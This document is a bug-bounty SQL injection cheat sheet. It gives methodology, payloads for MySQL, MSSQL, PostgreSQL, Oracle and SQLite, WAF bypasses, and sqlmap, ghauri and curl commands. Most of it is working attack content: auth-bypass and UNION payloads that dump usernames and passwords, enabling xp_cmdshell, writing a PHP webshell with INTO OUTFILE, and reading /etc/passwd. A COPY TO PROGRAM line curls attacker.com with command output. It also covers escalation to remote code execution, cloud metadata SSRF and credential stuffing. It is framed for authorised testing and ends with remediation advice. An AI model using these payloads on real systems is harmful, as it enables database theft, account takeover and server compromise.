# SQL Injection

> One-line summary: User input concatenated into SQL lets you alter query logic to bypass auth, read/write the whole database, and often reach RCE or full tenant data exposure — consistently one of the highest-paid bug classes.

## Overview

SQL injection occurs when untrusted input reaches a SQL query without parameterization, so the attacker controls query structure, not just a value. It arises from string-concatenated queries, unparameterizable positions (ORDER BY, table/column names, LIMIT in some drivers), raw ORM fragments (`DB::raw`, `$queryRawUnsafe`, `literal()`), and second-order flows where stored input is later concatenated by a different component. Impact scales with DBMS privileges: authentication bypass and full data read are the floor; `INTO OUTFILE`, `xp_cmdshell`, and `COPY TO PROGRAM` turn it into file write or OS command execution. In bug bounty it pays critical because one vulnerable parameter typically exposes every row in the database — including other tenants' data.

## Where to find it

- Search/filter/sort parameters: `?id=1`, `?q=`, `?sort=name`, `?order=asc`, `?filter=`, `?where=`, `?category=`
- Login, registration, password reset, email-change (auth bypass / account takeover)
- JSON API bodies: `{"id":1,"sort":"name","filters":{"status":"x"}}` — sort/filter keys rarely parameterized
- ORDER BY / GROUP BY / column names / LIMIT — prepared statements cannot bind identifiers, so devs concatenate
- Second-order: profile fields, filenames, support tickets later used in admin reports/exports/backups
- Headers that get logged and queried: `User-Agent`, `X-Forwarded-For`, Referer (analytics/WAF dashboards)
- Cookies: session lookups, "recently viewed" tracking, language/theme preferences
- GraphQL resolvers that call raw SQL with argument values
- Mobile/legacy API versions (`/api/v1/`) that lag behind web-layer WAF rules
- URL path segments: `/product/123'`, `/user/1%20AND%201=1`

## Methodology

1. **Find candidates** — collect every parameter/header/cookie from crawling, JS files, and API specs. Prioritize sort/filter/id parameters, login forms, and anything numeric or quoted. Mark which responses differ per input (error pages, empty vs full result sets).
2. **Probe for injection** — send a single quote `'`, then `"`, `)`, `'))`, and a backslash. Compare: new 500s, DB error strings (`SQL syntax`, `ORA-`, `ODBC`, `SQLite`, `pg_query()`), generic "error" pages, or a result set that changes shape.
3. **Baseline the types of response** — true/false control pair: `AND 1=1-- -` vs `AND 1=2-- -` (URL-encoded). Identical responses → try blind boolean; identical but timing changes on `SLEEP(5)` → time-based; DB echoes the error or value → error-based; result set renders extra columns → UNION.
4. **Determine column count** — `' ORDER BY 1-- -` increment until error (N-1 = columns), or `' UNION SELECT NULL-- -` adding NULLs until the response normalizes.
5. **Find printable columns** — inject markers: `' UNION SELECT 'AAAA','BBBB'-- -`; locate which marker appears where in the page.
6. **Extract in order** — DBMS banner (`@@version`, `version()`, `sqlite_version()`), current DB/user, schema (`information_schema.tables`), target table columns, then rows with `LIMIT 1 OFFSET n` — paginate, never bulk-dump.
7. **Blind confirmation without damage** — boolean oracle first: `' AND SUBSTRING((SELECT database()),1,1)='a'-- -`. Only if there is no boolean difference, go time-based with `SLEEP(5)` / `pg_sleep(5)` / `WAITFOR DELAY`. Run each timing probe 3x: a real injection is consistent (~5s every time); network jitter is not. Add a 2s control delay to prove you control the duration.
8. **Prove impact** — extract one credential row or an admin session token, or show `current_user` + a table you should not see. Everything read-only: no `DROP`, `UPDATE`, `DELETE`, no `INTO OUTFILE` on a live target unless the program explicitly allows it and you revert.

## Payloads

```sql
-- Classic / auth bypass
' OR '1'='1' -- -
' OR 1=1 -- -
' OR '1'='1' /*
admin' -- -
admin' #
") OR ("1"="1
' OR 'a'='a' LIMIT 1-- -
```

```sql
-- Error-based probing (cause a DB error containing data)
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -          -- MySQL
' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -          -- MySQL
' AND (SELECT 1 FROM(SELECT count(*),concat((SELECT version()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -   -- MySQL count/rand
' AND 1=CONVERT(int,(SELECT @@version))-- -                        -- MSSQL
' AND 1=CAST((SELECT version()) AS int)-- -                        -- PostgreSQL
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- -      -- Oracle
```

```sql
-- UNION-based (column discovery then extraction)
' ORDER BY 1-- -
' ORDER BY 5-- -                    -- 500 here → 4 columns
' UNION SELECT NULL,NULL,NULL,NULL-- -
-1' UNION SELECT 1,version(),database(),4-- -
-1' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -
-1' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'-- -
-1' UNION SELECT 1,group_concat(username,0x3a,password),3,4 FROM users-- -
```

```sql
-- Boolean blind (identical pages, different truth value)
' AND 1=1-- -
' AND 1=2-- -
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -
' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=32-- -
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100-- -
```

```sql
-- Time-based blind (confirm with 3 consistent runs)
-- MySQL
' AND SLEEP(5)-- -
' AND IF(SUBSTRING(database(),1,1)='t',SLEEP(5),0)-- -
' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -
-- PostgreSQL
' AND 1=(SELECT 1 FROM pg_sleep(5))-- -
'; SELECT pg_sleep(5)-- -
-- MSSQL
'; WAITFOR DELAY '0:0:5'-- -
' IF(1=1) WAITFOR DELAY '0:0:5'-- -
-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
' AND 1=(SELECT 1 FROM dual WHERE 1=1 AND dbms_pipe.receive_message(('a'),5)=1)-- -
-- SQLite (no sleep: heavy query instead)
' AND 1=randomblob(100000000)-- -
```

```sql
-- Batched / stacked queries (driver-dependent: MSSQL, PostgreSQL, MySQL via multi-statement APIs)
'; SELECT SLEEP(5)-- -
'; SELECT pg_sleep(5)-- -
'; WAITFOR DELAY '0:0:5'-- -
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -   -- MSSQL, sysadmin only
'; EXEC xp_cmdshell 'whoami'-- -                                   -- MSSQL
'; COPY (SELECT '') TO PROGRAM 'id'-- -                            -- PostgreSQL, superuser only
```

```sql
-- MySQL file primitives
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
' UNION SELECT 1,LOAD_FILE('C:\\Windows\\win.ini'),3-- -
' UNION SELECT '<?php system($_GET["c"]); ?>',2 INTO OUTFILE '/var/www/html/s.php'-- -
```

## Bypasses & edge cases

- **Keyword filters** — random case (`SeLeCt`), inline comments (`UN/**/ION SE/**/LECT`), MySQL versioned comments `/*!50000UNION*/` `/*!50000SELECT*/`.
- **Space filters** — `/**/`, `%09`, `%0a`, `+`, parentheses: `UNION(SELECT(username)FROM(users))`.
- **Quote filters** — MySQL hex literals `0x61646d696e` (= `admin`), `CHAR(97,100,109,105,110)`; MSSQL `N'admin'`; Unicode/double-encoded quotes `%2527` where the WAF decodes once.
- **AND/OR filtered** — `&&`, `||`, `^`, `XOR`, `NOT`; `||'1'='1` works on many engines as string concat comparison.
- **Comment syntax** — `-- -`, `--+`, `#`, `/* */`; URL-encode the trailing space: `--%20` or use `--%0a`.
- **WAF in front** — double URL-encode, Unicode fullwidth chars, chunked Transfer-Encoding bodies, HTTP parameter pollution (`id=1&id=1'`), switch GET↔POST, wrap in JSON (`{"id":"1'"}`), add junk params, change Content-Type to `application/json` so the WAF rule set changes.
- **Second-order** — store the payload in a profile field/filename, trigger the admin report or export; the injecting component is a different code path with different (or no) filters.
- **ORM quirks** — Sequelize `literal()`, Prisma `$queryRawUnsafe`, TypeORM `.where("... " + x)`, Hibernate HQL concatenation, Laravel `whereRaw`. HQL/JPQL injects too — `' OR 1=1` inside HQL, and `$where`-adjacent quirks in some ORMs.
- **Numeric vs string context** — no quote needed in numeric contexts: `?id=1 AND SLEEP(5)`; string context may need closing parens: `?id=1') AND SLEEP(5)-- -`.
- **ORDER BY context** — no UNION, no `--` comment sometimes: use `ORDER BY (CASE WHEN (1=1) THEN name ELSE id END)`, or boolean/time in the CASE.

## Tools

```bash
# sqlmap — basic sweep on a single parameter
sqlmap -u "https://target.com/item?id=1" --batch --level=3 --risk=2

# From a saved Burp request (keeps cookies/headers/CSRF token)
sqlmap -r request.txt -p id --batch
sqlmap -r request.txt -p id --technique=BEUST --dbms=mysql --level=5 --risk=3

# Enumerate then extract one row (avoid full dumps)
sqlmap -u "https://target.com/item?id=1" --dbs
sqlmap -u "https://target.com/item?id=1" -D appdb --tables
sqlmap -u "https://target.com/item?id=1" -D appdb -T users -C username,password --dump --stop 5

# File read / shell (only when program permits, on own test data)
sqlmap -u "https://target.com/item?id=1" --file-read=/etc/passwd
sqlmap -u "https://target.com/item?id=1" --os-shell

# Useful flags: --random-agent --proxy=http://127.0.0.1:8080 --flush-session
#   --csrf-token=csrf&--csrf-url=https://target.com/form  (re-fetch token per request)
#   --tamper=space2comment,between,charencode  (WAF bypass chain)
#   -v 3 (full payloads in log — copy these into the report)

# ghauri — lighter alternative, often faster tamper handling
ghauri -u "https://target.com/item?id=1" --dbs
ghauri -u "https://target.com/item?id=1" -D appdb -T users --dump

# Manual probe with curl (byte-exact payload, no tool fingerprint)
curl -s "https://target.com/item?id=1%20AND%20SLEEP(5)--%20-" -H 'Cookie: session=...' -w '\nTIME:%{time_total}\n'
```

Nuclei (DAST mode has SQLi checks that fuzz parameters in place):

```bash
nuclei -u "https://target.com/item?id=1" -dast -tags sqli
```

## Escalation & chaining

- **SQLi → RCE (MySQL)** — `INTO OUTFILE` a webshell into the webroot (requires FILE privilege and `secure_file_priv` allowing the path); or UDF injection (`lib_mysqludf_sys`) for `sys_exec`.
- **SQLi → RCE (MSSQL)** — enable and call `xp_cmdshell` (sysadmin required); alternatives: `sp_OACreate` (wscript.shell), `xp_dirtree` for SMB hash capture / auth-relay.
- **SQLi → RCE (PostgreSQL)** — `COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/$(id|base64 -w0)'` as superuser; `pg_read_file`/`pg_ls_dir` for file read.
- **SQLi → SSRF (Oracle)** — `UTL_HTTP.REQUEST('http://169.254.169.254/...')` to hit cloud metadata.
- **SQLi → account takeover** — auth-bypass in login, or dump a password-reset token table and use it directly.
- **SQLi → lateral movement** — dump app config tables for DB/app credentials reused on other internal hosts; credential stuffing against VPN/SSO with harvested accounts (accounts you own only, unless program allows).
- **Second-order → RCE** — inject into a field that lands in an admin import/export script that runs `COPY INTO`/`LOAD DATA` or builds an OS command.

## Report notes

- One vulnerable parameter, one payload, verbatim — raw HTTP request + response from Burp (`Request`/`Response` panes exported), not a paraphrase.
- For error-based: the exact DB error text and the version banner it disclosed.
- For blind/time-based: three timed runs each for the true condition vs false control, with ms values (e.g. `1=1 → 412ms`, `1=2 → 411ms`, `SLEEP(5) → 5421ms`), plus the raw request for each.
- Proof of what you could read: table/column names and ONE redacted row (`id=1, email=r***@example.com`) — programs reject reports with bulk PII dumps.
- DBMS + version, current database user, table count — proves scope of access.
- Impact sentence: "An unauthenticated attacker can read all rows of `users` (X records, includes emails and bcrypt hashes) via `?id=` on `GET /item`."
- Remediation: parameterized queries everywhere, allowlist for sort/column identifiers, least-privilege DB user (no FILE, no xp_cmdshell), generic error messages.

## References

- [PortSwigger — SQL injection](https://portswigger.net/web-security/sql-injection)
- [PortSwigger — SQLi cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP WSTG — Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [HackTricks — SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [payloadbox — SQL injection payload list](https://github.com/payloadbox/sql-injection-payload-list)
- [sqlmap usage wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
